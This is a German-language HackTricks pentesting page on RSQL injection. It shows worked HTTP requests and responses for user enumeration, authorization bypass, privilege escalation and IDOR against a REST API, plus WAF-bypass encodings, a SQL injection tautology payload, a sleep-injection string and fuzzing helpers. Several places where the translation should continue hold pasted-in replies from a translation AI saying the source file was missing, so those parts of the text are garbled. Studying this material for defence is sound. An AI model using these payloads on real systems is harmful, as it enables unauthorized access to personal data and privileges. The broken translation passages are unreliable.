# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## Was ist RSQL?
RSQL ist eine Abfragesprache, die für die parametrisierte Filterung von Eingaben in RESTful APIs entwickelt wurde. Basierend auf FIQL (Feed Item Query Language), ursprünglich von Mark Nottingham für das Abfragen von Atom-Feeds spezifiziert, zeichnet sich RSQL durch seine Einfachheit und die Fähigkeit aus, komplexe Abfragen kompakt und URI-konform über HTTP auszudrücken. Dadurch ist es eine ausgezeichnete Wahl als allgemeine Abfragesprache für die Suche an REST-Endpunkten.

## Überblick
RSQL Injection ist eine Schwachstelle in Webanwendungen, die RSQL als Abfragesprache in RESTful APIs verwenden. Ähnlich wie [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) und [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection) tritt diese Schwachstelle auf, wenn RSQL-Filter nicht ordnungsgemäß bereinigt werden, wodurch ein Angreifer bösartige Abfragen einschleusen kann, um Daten ohne Autorisierung zu lesen, ändern oder löschen.

## Wie funktioniert das?
RSQL ermöglicht es, in RESTful APIs erweiterte Abfragen zu erstellen, zum Beispiel:
```bash
/products?filter=price>100;category==electronics
```
Dies übersetzt sich in eine strukturierte Abfrage, die Produkte filtert, deren Preis größer als 100 ist und deren Kategorie „Elektronik“ ist.

Wenn die Anwendung Benutzereingaben nicht korrekt validiert, könnte ein Angreifer den Filter manipulieren, um unerwartete Abfragen auszuführen, wie zum Beispiel:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
Oder sogar ausnutzen, um sensible Informationen mit Boolean queries oder nested subqueries zu extrahieren.

## Risiken
- **Offenlegung sensibler Daten:** Ein Angreifer kann Informationen abrufen, die nicht zugänglich sein sollten.
- **Änderung oder Löschung von Daten:** Injection von Filtern, die Datenbankeinträge verändern.
- **Privilege escalation:** Manipulation von Identifikatoren, die über Filter Rollen zuweisen, um die Anwendung zu täuschen und mit den Rechten anderer Benutzer zuzugreifen.
- **Umgehung von Zugriffskontrollen:** Manipulation von Filtern, um auf eingeschränkte Daten zuzugreifen.
- **Impersonation or IDOR:** Änderung von Identifikatoren zwischen Benutzern durch Filter, die den Zugriff auf Informationen und Ressourcen anderer Benutzer ermöglichen, ohne korrekt als diese authentifiziert zu sein.

## Unterstützte RSQL-Operatoren
| Operator  | Description | Example  |
|:----: |:----: |:------------------:|
| `;` / `and` | Logischer **AND**-Operator. Filtert Zeilen, bei denen *beide* Bedingungen *wahr* sind | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | Logischer **OR**-Operator. Filtert Zeilen, bei denen *mindestens eine* Bedingung *wahr* ist | `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | Führt eine **Gleichheitsabfrage** durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* genau dem *queryValue* entsprechen | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | Führt eine **Suchabfrage** durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* *queryValue* enthalten | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | Führt eine **like**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* wie *queryValue* sind | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | Führt eine **in**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen *columnA* *valueA* ODER *valueB* enthält | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | Führt eine **Ausschluss**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* weder *valueA* noch *valueB* sind | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | Führt eine *not equals*-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* nicht *queryValue* entsprechen | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | Führt eine **not like**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* nicht wie *queryValue* sind | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | Führt eine **kleiner als**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* kleiner als *queryValue* sind | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | Führt eine **kleiner als oder gleich**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* kleiner als oder gleich *queryValue* sind | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | Führt eine **größer als**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* größer als *queryValue* sind | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | Führt eine **gleich oder größer als**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* gleich oder größer als *queryValue* sind | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | Führt eine **von-bis**-Abfrage durch. Gibt alle Zeilen aus *myTable* zurück, in denen die Werte in *columnA* gleich oder größer als *fromValue* und kleiner oder gleich *toValue* sind | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Hinweis**: Tabelle basiert auf Informationen von [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) und [**rsql-parser**](https://github.com/jirutka/rsql-parser) Anwendungen.

#### Beispiele
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Hinweis**: Tabelle basiert auf Informationen von [**rsql-parser**](https://github.com/jirutka/rsql-parser) Anwendung.

## Häufige Filter
Diese Filter helfen, Abfragen in APIs zu verfeinern:

| Filter | Description | Example |
|--------|------------|---------|
| `filter[users]` | Filtert Ergebnisse nach bestimmten Benutzern | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | Filtert nach Status (active/inactive, completed, etc.) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | Filtert Ergebnisse innerhalb eines Datumsbereichs | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | Filtert nach Kategorie oder Ressourcentyp | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | Filtert nach einer eindeutigen Kennung | `/api/v2/posts?filter[id]=42` |


## Häufige Parameter
Diese Parameter helfen, API-Antworten zu optimieren:

| Parameter | Description | Example |
|-----------|------------|---------|
| `include` | Nimmt verwandte Ressourcen in die Antwort auf | `/api/v2/orders?include=customer,items` |
| `sort` | Sortiert Ergebnisse auf- oder absteigend | `/api/v2/users?sort=-created_at` |
| `page[size]` | Steuert die Anzahl der Ergebnisse pro Seite | `/api/v2/products?page[size]=10` |
| `page[number]` | Gibt die Seitennummer an | `/api/v2/products?page[number]=2` |
| `fields[resource]` | Definiert, welche Felder in der Antwort zurückgegeben werden | `/api/v2/users?fields[users]=id,name,email` |
| `search` | Führt eine flexiblere Suche durch | `/api/v2/posts?search=technology` |

## Information leakage and enumeration of users
Die folgende Anfrage zeigt einen Registrierungs-Endpoint, der den Parameter email benötigt, um zu prüfen, ob ein Benutzer mit dieser E-Mail registriert ist, und true oder false zurückgibt, je nachdem, ob er in der Datenbank existiert oder nicht:
### Request
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Ich habe den Inhalt von src/pentesting-web/rsql-injection.md nicht erhalten. Bitte den Markdown-Inhalt hier einfügen — ich übersetze ihn ins Deutsche und belasse dabei alle Markdown-/HTML-Tags, Links und Pfade unverändert.
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
Obwohl eine `/api/registrations?email=<emailAccount>` erwartet wird, ist es möglich, RSQL-Filter zu verwenden, um mittels spezieller Operatoren zu versuchen, enumerate and/or extract user information:
### Anfrage
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Ich habe keinen Zugriff auf die Datei src/pentesting-web/rsql-injection.md. Bitte füge den Inhalt hier ein (oder die Abschnitte, die du übersetzt haben möchtest), dann übersetze ich ihn entsprechend den Vorgaben ins Deutsche.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
Im Falle einer Übereinstimmung mit einem gültigen E-Mail-Konto würde die Anwendung die Benutzerinformationen zurückgeben, statt des klassischen *“true”*, *"1"* oder ähnlichem in der Antwort an den Server:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Ich habe keinen Zugriff auf die Datei. Bitte sende den Inhalt von src/pentesting-web/rsql-injection.md (oder den zu übersetzenden Text). Ich werde dann den englischen Text ins Deutsche übersetzen und dabei Markdown/HTML, Code, Tags, Links, Pfade und Techniknamen unverändert lassen.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
In diesem Szenario beginnen wir mit einem Benutzer mit einer einfachen Rolle, bei dem wir keine privilegierten Berechtigungen (z. B. Administrator) haben, um auf die Liste aller in der Datenbank registrierten Benutzer zuzugreifen:
### Anfrage
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Ich habe keinen Zugriff auf die Datei src/pentesting-web/rsql-injection.md. Bitte füge den Markdown-Inhalt hier ein (oder den relevanten Abschnitt), dann übersetze ich ihn ins Deutsche unter Beibehaltung aller Markdown-/HTML-Tags, Links, Pfade und spezieller Tokens wie von dir beschrieben.
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
Erneut nutzen wir die Filter und speziellen Operatoren, die uns eine alternative Möglichkeit bieten, Informationen über die users zu erhalten und die access control zu umgehen.
Zum Beispiel filtere nach jenen *users*, die den Buchstaben „*a*“ in ihrer user *ID* enthalten:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Bitte den Inhalt der Datei (z. B. src/pentesting-web/rsql-injection.md) hier einfügen. Ich übersetze ihn dann ins Deutsche und behalte die Markdown-/HTML-Syntax sowie die angegebenen Ausnahmeregeln bei.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
Es ist sehr wahrscheinlich, bestimmte Endpunkte zu finden, die Benutzerprivilegien über ihre Rolle prüfen. Zum Beispiel haben wir es mit einem Benutzer zu tun, der keine Privilegien hat:
### Request
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Ich habe den Inhalt der Datei src/pentesting-web/rsql-injection.md nicht erhalten. Bitte füge den Markdown-Inhalt dieser Datei hier ein, dann übersetze ich den relevanten englischen Text ins Deutsche unter Beibehaltung der vorhandenen Markdown- und HTML-Syntax.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
Mit bestimmten Operatoren konnten wir Administrator-Benutzer auflisten:
### Anfrage
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Antwort
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
Nachdem der Identifikator (ID) eines Administrator-Benutzers bekannt ist, wäre es möglich, eine privilege escalation auszunutzen, indem man den entsprechenden Filter durch die ID des Administrators ersetzt oder hinzufügt und so dieselben Privilegien erhält:
### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Bitte sende den Inhalt der Datei src/pentesting-web/rsql-injection.md oder den zu übersetzenden Text. Ich übersetze ihn ins Deutsche und lasse Markdown-/HTML-Tags, Links und Pfade unverändert.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
Zusätzlich zur Verwendung des Parameters `filter` ist es möglich, andere Parameter wie `include` zu verwenden, mit denen bestimmte Felder (z. B. Sprache, Land, Passwort...) im Ergebnis eingeschlossen werden können.

Im folgenden Beispiel werden die Informationen unseres Benutzerprofils angezeigt:
### Anfrage
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Ich habe den Inhalt von src/pentesting-web/rsql-injection.md nicht erhalten. Bitte füge den englischen Markdown-Inhalt hier ein, dann übersetze ich ihn ins Deutsche unter Beibehaltung aller Markdown-/HTML-Tags, Links, Pfade und Codeblöcke (wie in deinen Vorgaben).
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
Die Kombination von Filtern kann verwendet werden, um die Autorisierungskontrolle zu umgehen und Zugriff auf die Profile anderer Benutzer zu erhalten:
### Request
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Antwort
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## Erkennung & Fuzzing Quickwins
- Prüfe auf RSQL-Unterstützung, indem du harmlose Probes sendest wie `?filter=id==test`, `?q==test` oder malformierte Operatoren `=foo=`; verbose APIs leak oft Parser-Fehlermeldungen ("Unknown operator" / "Unknown property").
- Viele Implementierungen parsen URL-Parameter doppelt; probiere Doppel-Encoding von `(`, `)`, `*`, `;` (z. B. `%2528admin%2529`), um naive Blocklists und WAFs zu umgehen.
- Boolean exfil mit Wildcards: `filter[users]=email==*%@example.com;status==ACTIVE` und die Logik mit `,` (OR) umdrehen, um Antwortgrößen zu vergleichen.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` enumeriert schnell nach Jahr, ohne genaue IDs zu kennen.

## Framework-spezifischer Missbrauch (Elide / JPA Specification / JSON:API)
- Elide und viele Spring Data REST-Projekte übersetzen RSQL direkt in JPA Criteria. Wenn Entwickler benutzerdefinierte Operatoren hinzufügen (z. B. `=ilike=`) und Prädikate per String-Konkatenation statt vorbereiteter Parameter bauen, kannst du zu SQLi pivoten (klassische Payload: `name=ilike='%%' OR 1=1--'`).
- Der Elide analytic data store akzeptiert parameterized columns; die Kombination von nutzerkontrollierten Analyse-Parametern mit RSQL-Filtern war die Wurzel von SQLi in CVE-2022-24827. Selbst wenn gepatchte Versionen korrekt parameterisieren, bleibt ähnliche maßgeschneiderte Logik oft bestehen — suche nach `@JoinFilter`/`@ReadPermission` SpEL-Ausdrücken, die `${}` enthalten, und versuche `';sleep(5);'` oder logische Tautologien zu injizieren.
- JSON:API-Backends exponieren häufig sowohl `include` als auch `filter`. Das Filtern auf verwandten Ressourcen `filter[orders]=customer.email==*admin*` kann Top-Level-ACLs umgehen, weil relation-level filters vor Ownership-Checks ausgeführt werden.

## Automatisierungshilfen
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` validiert Payloads lokal und zeigt den abstract syntax tree — nützlich, um ausgeglichene Klammern und benutzerdefinierte Operatoren zu erstellen.
- Python Schnellgenerator:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- Kombiniere es mit einem HTTP fuzzer (ffuf, turbo-intruder), indem du Wildcard-Positionen `*a*`, `*e*` usw. innerhalb von `=in=`-Listen iterierst, um IDs und E-Mails schnell zu enumerieren.

## Referenzen
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
